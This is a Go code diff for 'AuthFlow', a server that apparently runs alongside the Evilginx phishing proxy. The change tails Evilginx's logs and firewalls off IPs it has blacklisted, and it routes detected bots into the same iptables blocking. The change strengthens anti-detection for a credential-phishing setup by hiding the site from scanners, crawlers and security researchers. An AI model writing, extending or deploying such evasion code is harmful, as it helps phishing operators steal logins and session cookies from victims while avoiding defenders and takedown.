@@ -1,6 +1,7 @@
 package server
 
 import (
+	"bufio"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -98,6 +99,9 @@ func (s *Server) Start(port int) error {
 	log.Printf("[+] AuthFlow Server active on port %d", port)
 	log.Printf("[+] Dashboard access: http://%s:%d/%s", s.config.Domain, port, s.config.AdminPath)
 	
+	// Start proactive bot blocking by monitoring Evilginx logs
+	go s.monitorEvilginxLogs()
+
 	addr := fmt.Sprintf("0.0.0.0:%d", port)
 	certFile := fmt.Sprintf("/etc/letsencrypt/live/%s/fullchain.pem", s.config.Domain)
 	keyFile := fmt.Sprintf("/etc/letsencrypt/live/%s/privkey.pem", s.config.Domain)
@@ -167,24 +171,57 @@ func (s *Server) broadcast(event map[string]interface{}) {
 	}
 }
 
+func (s *Server) blockIP(ip, reason string) {
+	// Check cache to prevent terminal flooding and redundant commands
+	if _, seen := s.botCache.Load(ip); seen {
+		return
+	}
+
+	s.botCache.Store(ip, true)
+	log.Printf("[!] Proactive Block: %s (%s). Applying system-wide firewall rule.", ip, reason)
+
+	// Block the IP system-wide in the background via iptables
+	// This stops the traffic before it even reaches Evilginx
+	go exec.Command("sudo", "iptables", "-I", "INPUT", "-s", ip, "-j", "DROP").Run()
+}
+
+func (s *Server) monitorEvilginxLogs() {
+	// Wait for Evilginx to initialize
+	time.Sleep(5 * time.Second)
+
+	// Tail the Evilginx service logs
+	cmd := exec.Command("sudo", "journalctl", "-u", "evilginx", "-f", "-n", "0")
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		log.Printf("[-] Failed to pipe Evilginx logs: %v", err)
+		return
+	}
+
+	if err := cmd.Start(); err != nil {
+		log.Printf("[-] Failed to monitor Evilginx logs: %v", err)
+		return
+	}
+
+	scanner := bufio.NewScanner(stdout)
+	for scanner.Scan() {
+		line := scanner.Text()
+		// Detect Evilginx's own blacklist detection
+		if strings.Contains(line, "blacklisted ip address:") {
+			parts := strings.Split(line, "blacklisted ip address: ")
+			if len(parts) > 1 {
+				ip := strings.TrimSpace(parts[1])
+				s.blockIP(ip, "Evilginx Blacklist")
+			}
+		}
+	}
+}
+
 func (s *Server) botFilter() gin.HandlerFunc {
 	return func(c *gin.Context) {
 		ip := monitor.GetClientIP(c.Request.Header, c.ClientIP())
-
-		// Check cache to prevent terminal flooding for already blocked IPs
-		if _, seen := s.botCache.Load(ip); seen {
-			c.AbortWithStatus(404)
-			return
-		}
-
 		ua := c.GetHeader("User-Agent")
 		if isBot, reason := monitor.IsBot(ua); isBot {
-			s.botCache.Store(ip, true)
-			log.Printf("[!] Bot Detected: %s (%s). Silencing and blocking system-wide.", ip, reason)
-
-			// Block the IP system-wide in the background via iptables
-			go exec.Command("sudo", "iptables", "-I", "INPUT", "-s", ip, "-j", "DROP").Run()
-
+			s.blockIP(ip, reason)
 			c.AbortWithStatus(404)
 			return
 		}
